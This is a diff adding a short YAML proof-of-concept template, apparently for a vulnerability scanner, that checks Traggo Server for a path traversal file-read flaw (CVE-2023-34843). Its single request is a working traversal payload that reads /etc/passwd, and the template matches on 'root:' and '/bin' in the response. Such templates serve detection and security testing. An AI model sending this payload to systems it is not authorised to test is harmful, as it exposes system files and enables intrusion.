@@ -1,0 +1,17 @@
+id: poc-yaml-traggo-static-path-traversal
+info:
+  name: Traggo Server 任意文件读取漏洞
+  severity: high
+  tags:
+  - CVE-2023-34843
+  - 两高一弱
+  finger: Traggo Server
+requests:
+- method: GET
+  path: /static/..%5c..%5c..%5c..%5cetc/passwd
+  expression: 'status_code == 200 && contains(body, "root:") && !contains(body, "<")
+    && contains(body, "/bin")
+
+    '
+variables: {}
+transport: http
